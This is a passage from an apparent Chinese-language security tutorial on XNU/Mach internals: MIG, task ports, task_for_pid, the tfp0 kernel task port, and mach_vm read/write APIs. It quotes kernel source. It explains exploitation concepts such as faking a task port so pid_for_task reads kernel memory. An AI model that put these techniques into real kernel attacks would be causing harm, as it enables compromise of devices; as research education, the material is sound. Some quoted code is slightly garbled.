class="comment"> *		except that the right gets the specified name.</span></span><br><span class="line"><span class="comment"> *	Conditions:</span></span><br><span class="line"><span class="comment"> *		Nothing locked.</span></span><br><span class="line"><span class="comment"> *	Returns:</span></span><br><span class="line"><span class="comment"> *		KERN_SUCCESS		Inserted the right.</span></span><br><span class="line"><span class="comment"> *		KERN_INVALID_TASK	The space is null.</span></span><br><span class="line"><span class="comment"> *		KERN_INVALID_TASK	The space is dead.</span></span><br><span class="line"><span class="comment"> *		KERN_INVALID_VALUE	The name isn&#x27;t a legal name.</span></span><br><span class="line"><span class="comment"> *		KERN_NAME_EXISTS	The name already denotes a right.</span></span><br><span class="line"><span class="comment"> *		KERN_INVALID_VALUE	Message doesn&#x27;t carry a port right.</span></span><br><span class="line"><span class="comment"> *		KERN_INVALID_CAPABILITY	Port is null or dead.</span></span><br><span class="line"><span class="comment"> *		KERN_UREFS_OVERFLOW	Urefs limit would be exceeded.</span></span><br><span class="line"><span class="comment"> *		KERN_RIGHT_EXISTS	Space has rights under another name.</span></span><br><span class="line"><span class="comment"> *		KERN_RESOURCE_SHORTAGE	Couldn&#x27;t allocate memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">mach_port_insert_right</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">ipc_space_t</span>			space,</span></span><br><span class="line"><span class="params">	<span class="type">mach_port_name_t</span>		name,</span></span><br><span class="line"><span class="params">	<span class="type">ipc_port_t</span>			poly,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_type_name_t</span>		polyPoly)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (space == IS_NULL)</span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_TASK;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!MACH_PORT_VALID(name) ||</span><br><span class="line">	    !MACH_MSG_TYPE_PORT_ANY_RIGHT(polyPoly))</span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_VALUE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!IO_VALID((<span class="type">ipc_object_t</span>) poly))</span><br><span class="line">		<span class="keyword">return</span> KERN_INVALID_CAPABILITY;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ipc_object_copyout_name(space, (<span class="type">ipc_object_t</span>) poly, </span><br><span class="line">				       polyPoly, FALSE, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="MIG-Mach接口生成器"><a href="#MIG-Mach接口生成器" class="headerlink" title="MIG-Mach接口生成器"></a>MIG-Mach接口生成器</h3><p>使用Mach API编写的许多代码都包含相同的样板代码，多次重复可能会导致复杂性，甚至导致安全漏洞，因此MIG非常方便。它基于MIG规范文件(defs)实现桩函数。客户端可以像调用任何其他C函数一样调用此桩函数，并且桩函数可以处理进出mach消息的数据的编组和解编组，从而控制发生在底层的所有Mach IPC实现。<br>MIG规范文件具有扩展名defs，并且在编译内核时，这些文件由mig处理并生成额外的文件，这些文件包含自动生成的MIG封装器。</p>
<p>以<code>osfmk/mach/task.defs</code>中的<code>task.defs</code>文件为例，每个defs文件都有一个子系统名称，后跟一个任意数字，该数字在文件的开头声明。task.defs文件的子系统名称为task，数字为3400。桩函数还可以检查传递给它的参数的有效性。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">subsystem</span><br><span class="line"><span class="meta">#<span class="keyword">if</span>	KERNEL_SERVER</span></span><br><span class="line">	  KernelServer</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>	<span class="comment">/* KERNEL_SERVER */</span></span></span><br><span class="line">	  task <span class="number">3400</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mach/std_types.defs&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mach/mach_types.defs&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mach_debug/mach_debug_types.defs&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Create a new task with an empty set of IPC rights,</span></span><br><span class="line"><span class="comment"> *	and having an address space constructed from the</span></span><br><span class="line"><span class="comment"> *	target task (or empty, if inherit_memory is FALSE).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">routine <span class="title function_">task_create</span><span class="params">(</span></span><br><span class="line"><span class="params">		target_task	: <span class="type">task_t</span>;</span></span><br><span class="line"><span class="params">		ledgers		: <span class="type">ledger_array_t</span>;</span></span><br><span class="line"><span class="params">		inherit_memory	: <span class="type">boolean_t</span>;</span></span><br><span class="line"><span class="params">	out	child_task	: <span class="type">task_t</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>如果要生成MIG封装器，则可以在包含def文件的目录运行mig。</p>
<p>在编译期间，mig工具根据子系统名称创建三个文件。例如对于task子系统，将创建以下文件：</p>
<ul>
<li>taskUser.c-该文件包含代理函数的实现，该代理函数负责将数据编组为消息并发送。它还负责解组返回的数据并将其发送回客户端</li>
<li>task.c-代理函数的原型</li>
<li>taskServer.c-桩函数的实现包含在此文件中</li>
</ul>
<p>在生成的文件中定义了许多大部分是函数的routine。如routine <code>task_set_exception_port</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Routine task_set_exception_ports */</span></span><br><span class="line">mig_internal novalue _Xtask_set_exception_ports</span><br><span class="line">	(<span class="type">mach_msg_header_t</span> *InHeadP, <span class="type">mach_msg_header_t</span> *OutHeadP)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  __MigPackStructs</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(push, 4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">mach_msg_header_t</span> Head;</span><br><span class="line">		<span class="comment">/* start of the kernel processed data */</span></span><br><span class="line">		<span class="type">mach_msg_body_t</span> msgh_body;</span><br><span class="line">		<span class="type">mach_msg_port_descriptor_t</span> new_port;</span><br><span class="line">		<span class="comment">/* end of the kernel processed data */</span></span><br><span class="line">		NDR_record_t NDR;</span><br><span class="line">		<span class="type">exception_mask_t</span> exception_mask;</span><br><span class="line">		<span class="type">exception_behavior_t</span> behavior;</span><br><span class="line">		<span class="type">thread_state_flavor_t</span> new_flavor;</span><br><span class="line">		<span class="type">mach_msg_trailer_t</span> trailer;</span><br><span class="line">	&#125; Request __attribute__((unused));</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span>  __MigPackStructs</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(pop)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">typedef</span> __Request__task_set_exception_ports_t __Request;</span><br><span class="line">	<span class="keyword">typedef</span> __Reply__task_set_exception_ports_t Reply __attribute__((unused));</span><br></pre></td></tr></table></figure>

<p><strong>审计这些函数中的代码也非常重要。</strong></p>
<h3 id="任务端口"><a href="#任务端口" class="headerlink" title="任务端口"></a>任务端口</h3><p>Mach端口的另一个有用的功能是它们充当对象的抽象，而该抽象是由Mach消息提供的，这些消息主要通过MIG进行转换。例如，主机Mach端口提供许多API，以获取有关主机的信息。<code>host_kernel_version()</code>函数将打印内核版本。这与<code>uname -r</code>命令使用的API相同。查看<code>osfmk/mach/mach_host.defs</code>文件将显示主机端口API提供的所有routine。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Return information about this host.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">routine <span class="title function_">host_info</span><span class="params">(</span></span><br><span class="line"><span class="params">		host		: <span class="type">host_t</span>;</span></span><br><span class="line"><span class="params">		flavor		: <span class="type">host_flavor_t</span>;</span></span><br><span class="line"><span class="params">	out	host_info_out	: <span class="type">host_info_t</span>, CountInOut)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Get string describing current kernel version.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">routine	<span class="title function_">host_kernel_version</span><span class="params">(</span></span><br><span class="line"><span class="params">		host		: <span class="type">host_t</span>;</span></span><br><span class="line"><span class="params">	out	kernel_version	: <span class="type">kernel_version_t</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>类似，任务端口用作任务的抽象。可以在<code>osfmk/mach/task.def</code>或者BUILD文件夹中的<code>osfmk/mach/task.defs</code>找到这些API。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Read the selected state which is to be installed on new </span></span><br><span class="line"><span class="comment"> * threads in the task as they are created.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">routine <span class="title function_">task_get_state</span><span class="params">(</span></span><br><span class="line"><span class="params">		task		: <span class="type">task_t</span>;</span></span><br><span class="line"><span class="params">		flavor		: <span class="type">thread_state_flavor_t</span>;</span></span><br><span class="line"><span class="params">	out	old_state	: <span class="type">thread_state_t</span>, CountInOut)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Set the selected state information to be installed on</span></span><br><span class="line"><span class="comment"> * all subsequently created threads in the task.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">routine	<span class="title function_">task_set_state</span><span class="params">(</span></span><br><span class="line"><span class="params">		task		: <span class="type">task_t</span>;</span></span><br><span class="line"><span class="params">		flavor		: <span class="type">thread_state_flavor_t</span>;</span></span><br><span class="line"><span class="params">		new_state	: <span class="type">thread_state_t</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Change the task&#x27;s physical footprint limit (in MB).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">routine <span class="title function_">task_set_phys_footprint_limit</span><span class="params">(</span></span><br><span class="line"><span class="params">		task		: <span class="type">task_t</span>;</span></span><br><span class="line"><span class="params">		new_limit	: <span class="type">int</span>;</span></span><br><span class="line"><span class="params">	out old_limit	: <span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line">routine <span class="title function_">task_suspend2</span><span class="params">(</span></span><br><span class="line"><span class="params">		target_task : <span class="type">task_t</span>;</span></span><br><span class="line"><span class="params">	out suspend_token : <span class="type">task_suspension_token_t</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>这些API十分强大，可以与目标进程进行完全交互。具有进程的任务端口的发送权限将完全控制该任务，包括在目标任务内存区域中读取，写入和分配内存。这里提到的是进程(来自BSD)的任务(来自Mach)端口，需要注意的是，它们内部是有联系的。每个BSD进程都有一个对应的Mach任务，反之亦然。可以在<code>osfmk/kern/task.h</code>下找到task结构体，其中的<code>bsd_info</code>指向<code>bsd/sys/proc_internal.h</code>中的proc结构体。同样，proc结构体中的task是指向该进程的task结构体的指针。</p>
<p><img src="https://highaltitudehacks.com/images/21.png" alt="21"></p>
<p>使用Mach系统调用<code>task_for_pid()</code>，可以将与目标PID相对应的任务端口的发送权限发送给调用方。从<code>bsd/vm/vm_unix.c</code>中的以下注释可以看出，仅允许特权进程或具有相同用户ID的进程调用。除此之外，调用此API还需要某些权限<code>get-task-allow</code>和<code>task_for_pid-allow</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	Routine:	task_for_pid</span></span><br><span class="line"><span class="comment"> *	Purpose:</span></span><br><span class="line"><span class="comment"> *		Get the task port for another &quot;process&quot;, named by its</span></span><br><span class="line"><span class="comment"> *		process ID on the same host as &quot;target_task&quot;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *		Only permitted to privileged processes, or processes</span></span><br><span class="line"><span class="comment"> *		with the same user ID.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *		Note: if pid == 0, an error is return no matter who is calling.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * XXX This should be a BSD system call, not a Mach trap!!!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">task_for_pid</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="keyword">struct</span> task_for_pid_args *args)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">mach_port_name_t</span>	target_tport = args-&gt;target_tport;</span><br><span class="line">	<span class="type">int</span>			pid = args-&gt;pid;</span><br><span class="line">	<span class="type">user_addr_t</span>		task_addr = args-&gt;t;</span><br><span class="line">	<span class="type">proc_t</span> 			p = PROC_NULL;</span><br><span class="line">	<span class="type">task_t</span>			t1 = TASK_NULL;</span><br><span class="line">	<span class="type">task_t</span>			task = TASK_NULL;</span><br><span class="line">	<span class="type">mach_port_name_t</span>	tret = MACH_PORT_NULL;</span><br><span class="line">	<span class="type">ipc_port_t</span> 		tfpport = MACH_PORT_NULL;</span><br><span class="line">	<span class="type">void</span> * sright;</span><br><span class="line">	<span class="type">int</span> error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	AUDIT_MACH_SYSCALL_ENTER(AUE_TASKFORPID);</span><br><span class="line">	AUDIT_ARG(pid, pid);</span><br><span class="line">	AUDIT_ARG(mach_port1, target_tport);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Always check if pid == 0 */</span></span><br><span class="line">	<span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">		(<span class="type">void</span> ) copyout((<span class="type">char</span> *)&amp;t1, task_addr, <span class="keyword">sizeof</span>(<span class="type">mach_port_name_t</span>));</span><br><span class="line">		AUDIT_MACH_SYSCALL_EXIT(KERN_FAILURE);</span><br><span class="line">		<span class="keyword">return</span>(KERN_FAILURE);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>有一点是需要注意的，<code>task_for_pid()</code>始终会检查pid是否为0，以防止通过调用<code>task_for_pid(0)</code>获取到内核任务端口的发送权限，这个操作叫tfp0。在之前，一旦能够任意读写内核内存，越狱程序就会patch该检查并调用task_for_pid(0)。但是随着KPP和AMCC&#x2F;KTRR的出现，不再能patch内核，因此使用了其它技术。<strong>tfp0这个叫法仍然存在，用于表示读写内核内存。</strong></p>
<p>另一个非常常用的API是Mach系统调用<code>pid_for_task()</code>，用于查找与给定Mach任务相对应的进程的pid。它通常做的是查找task结构体，查找其中的<code>bsd_info</code>指向的内核中的proc结构体，并从proc结构体中读取p_pid。此技术已被广泛用于通过创建伪造的任务端口一次读取任意四个字节的内核内存（因为pid为32位）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * pid_for_task</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Find the BSD process ID for the Mach task associated with the given Mach port </span></span><br><span class="line"><span class="comment"> * name</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Parameters:	args		User argument descriptor (see below)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Indirect parameters:	args-&gt;t		Mach port name</span></span><br><span class="line"><span class="comment"> * 			args-&gt;pid	Process ID (returned value; see below)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns:	KERL_SUCCESS	Success</span></span><br><span class="line"><span class="comment"> * 		KERN_FAILURE	Not success           </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Implicit returns: args-&gt;pid		Process ID</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">pid_for_task</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="keyword">struct</span> pid_for_task_args *args)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">mach_port_name_t</span>	t = args-&gt;t;</span><br><span class="line">	<span class="type">user_addr_t</span>		pid_addr  = args-&gt;pid;  </span><br><span class="line">	<span class="type">proc_t</span> p;</span><br><span class="line">	<span class="type">task_t</span>		t1;</span><br><span class="line">	<span class="type">int</span>	pid = <span class="number">-1</span>;</span><br><span class="line">	<span class="type">kern_return_t</span>	err = KERN_SUCCESS;</span><br><span class="line"></span><br><span class="line">	AUDIT_MACH_SYSCALL_ENTER(AUE_PIDFORTASK);</span><br><span class="line">	AUDIT_ARG(mach_port1, t);</span><br><span class="line"></span><br><span class="line">	t1 = port_name_to_task_inspect(t);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (t1 == TASK_NULL) &#123;</span><br><span class="line">		err = KERN_FAILURE;</span><br><span class="line">		<span class="keyword">goto</span> pftout;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		p = get_bsdtask_info(t1);</span><br><span class="line">		<span class="keyword">if</span> (p) &#123;</span><br><span class="line">			pid  = proc_pid(p);</span><br><span class="line">			err = KERN_SUCCESS;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_corpsetask(t1)) &#123;</span><br><span class="line">			pid = task_pid(t1);</span><br><span class="line">			err = KERN_SUCCESS;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			err = KERN_FAILURE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	task_deallocate(t1);</span><br><span class="line">pftout:</span><br><span class="line">	AUDIT_ARG(pid, pid);</span><br><span class="line">	(<span class="type">void</span>) copyout((<span class="type">char</span> *) &amp;pid, pid_addr, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">	AUDIT_MACH_SYSCALL_EXIT(err);</span><br><span class="line">	<span class="keyword">return</span>(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="内核任务端口"><a href="#内核任务端口" class="headerlink" title="内核任务端口"></a>内核任务端口</h3><p>内核被分配了PID 0，相应的无进程任务被称为内核任务。拥有内核任务的发送权限可以完全控制内核内存，对内核内存进行读写，还可以通过分配内存来注入任意代码（EXP执行原理）。<br>如前所述，调用<code>task_for_pid(0)</code>的古老方法之一是patch对pid&#x3D;0的检查。macOS上不安全内核<code>(#if defined SECURE_KERNEL)</code>也有一个<code>processer_set_tasks()</code> API会将内核任务端口作为第一个参数返回。<br>获得内核任务端口后，以下五个MACH API经常用于与内存进行交互。需要注意的是，要成功执行此函数，调用者必须拥有目标任务的任务端口的发送权限。如果查看函数原型，则第一个参数是目标任务<code>(vm_map_t target_task)</code>。可以将内核任务端口<code>(mach_port_t tfp0)</code>作为第一个参数传递给它。具体的代码在<code>libsyscall/mach/mach_vm.c</code>中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*Allocate a region of virtual memory in the target task starting from user specified address*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span> </span><br><span class="line"><span class="title function_">mach_vm_allocate</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">vm_map_t</span> target,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_address_t</span> *address,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_size_t</span> size,</span></span><br><span class="line"><span class="params">	<span class="type">int</span> flags</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Deallocate a region of virtual memory in the target task starting from user specified address*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span> </span><br><span class="line"><span class="title function_">mach_vm_deallocate</span></span><br><span class="line"><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">vm_map_t</span> target,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_address_t</span> address,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_size_t</span> size</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Read Kernel Memory in the target task at a specified address and transfers it to dynamically allocated memory in the callers address space*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">mach_vm_read</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">vm_map_t</span>		<span class="built_in">map</span>,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_address_t</span>	addr,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_size_t</span>	size,</span></span><br><span class="line"><span class="params">	<span class="type">pointer_t</span>		*data,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_type_number_t</span>	*data_size)</span> *data_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Copy data from a caller-specified address to the given memory region in the target tasks address space*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span> </span><br><span class="line"><span class="title function_">mach_vm_write</span></span><br><span class="line"><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">vm_map_t</span> target_task,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_address_t</span> address,</span></span><br><span class="line"><span class="params">	<span class="type">vm_offset_t</span> data,</span></span><br><span class="line"><span class="params">	<span class="type">mach_msg_type_number_t</span> dataCnt</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Sets the Protection attribute for a given memory range in the target tasks address space*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span> </span><br><span class="line"><span class="title function_">mach_vm_protect</span><span class="params">(</span></span><br><span class="line"><span class="params">	<span class="type">vm_map_t</span> target_task,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_address_t</span> address,</span></span><br><span class="line"><span class="params">	<span class="type">mach_vm_size_t</span> size, </span></span><br><span class="line"><span class="params">	<span class="type">boolean_t</span> set_maximum,</span></span><br><span class="line"><span class="params">	<span class="type">svm_prot_t</span> new_protection)</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Mach凭证"><a href="#Mach凭证" class="headerlink" title="Mach凭证"></a>Mach凭证</h3><p>Mach凭证（<code>osfmk/ipc/ipc_voucher.h</code>）在内核中的表示为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * IPC Voucher</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 凭证是对特定资源管理器属性值的引用计数的不可变（一旦创建）的索引集</span></span><br><span class="line"><span class="comment"> * (which themselves are reference counted).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_voucher</span> &#123;</span></span><br><span class="line">	<span class="type">iv_index_t</span>		iv_hash;	<span class="comment">/* checksum hash */</span></span><br><span class="line">	<span class="type">iv_index_t</span>		iv_sum;		<span class="comment">/* checksum of values */</span></span><br><span class="line">	<span class="type">os_refcnt_t</span>		iv_refs;	<span class="comment">/* reference count */</span></span><br><span class="line">	<span class="type">iv_index_t</span>		iv_table_size;	<span class="comment">/* size of the voucher table */</span></span><br><span class="line">	<span class="type">iv_index_t</span>		iv_inline_table[IV_ENTRIES_INLINE];</span><br><span class="line">	<span class="type">iv_entry_t</span>		iv_table;	<span class="comment">/* table of voucher attr entries */</span></span><br><span class="line">	<span class="type">ipc_port_t</span>		iv_port;	<span class="comment">/* port representing the voucher */</span></span><br><span class="line">	<span class="type">queue_chain_t</span>		iv_hash_link;	<span class="comment">/* link on hash chain */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

